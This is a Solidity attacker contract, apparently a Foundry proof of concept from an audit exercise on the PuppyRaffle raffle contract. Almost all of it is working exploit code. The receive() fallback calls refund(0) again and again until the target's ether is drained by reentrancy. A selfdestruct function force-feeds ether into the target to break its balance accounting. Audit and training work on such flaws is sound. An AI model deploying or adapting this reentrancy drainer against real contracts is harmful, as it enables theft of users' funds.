// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "./PuppyRaffle.sol";

contract Attacker {
    PuppyRaffle contractToAttack;

    constructor(address _raffle) {
        contractToAttack = PuppyRaffle(_raffle);
    }

    function Attack() public {
        console.log("Contract balance", address(contractToAttack).balance);
        console.log("Attacker balance", address(this).balance);

        address[] memory players = new address[](1);
        players[0] = address(this);
        contractToAttack.enterRaffle{value: 1 ether}(players);

        console.log(
            "Deposited 1 Ether, Contract balance",
            address(contractToAttack).balance
        );
        contractToAttack.refund(0); // exploit here

        console.log("Attack contract balance", address(this).balance);
        console.log("Contract balance", address(contractToAttack).balance);
    }

    function SelfDestructAttack() public {
        selfdestruct(payable(address(contractToAttack)));
    }

    function deposit() public {
        (bool result, ) = payable(address(contractToAttack)).call{
            value: 1 ether
        }("");
        require(result, "ASD");
    }

    // we want to use fallback function to exploit reentrancy
    receive() external payable {
        console.log("Attack contract balance", address(this).balance);
        console.log("Contract balance", address(contractToAttack).balance);
        if (address(contractToAttack).balance > 0 ether) {
            contractToAttack.refund(0); // exploit here
        }
    }
}
